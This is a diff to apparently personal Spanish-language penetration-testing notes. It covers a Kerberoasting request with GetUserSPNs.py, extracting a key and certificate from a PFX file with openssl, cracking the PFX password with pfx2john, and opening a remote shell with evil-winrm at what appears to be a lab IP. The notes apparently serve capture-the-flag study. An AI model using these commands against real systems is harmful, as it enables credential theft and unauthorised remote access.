@@ -13,3 +13,14 @@ GetUserSPNs.py <domain>/usr:psswd
 #Si se tienen credenciales se intenta esdto para kerberoasting attack para obtener un TGS
 #Esto devuelve un ticket en caso de ser psible.
 -> ntpdate <ip> para sincronizar la hora con la de nuestro servidor
+
+###PFX file
+Este file tiene un certificado ssl en PKCS12. Usando openssl podemos extraerlo
+openssl pkcs12 -in name.pfx -nocert -out key.pem -nodes
+openssl pkcs12 -in name.pfx -nokeys -out cert.pem
+#Extraccion
+
+En el caso de pedir pwd se puede utilizar johntheripper: pfx2john
+
+evil-winrm -k key.pem -c cert.pem -i 10.10.11.152 -S
+#Coneccion mediante key y cert a la ip
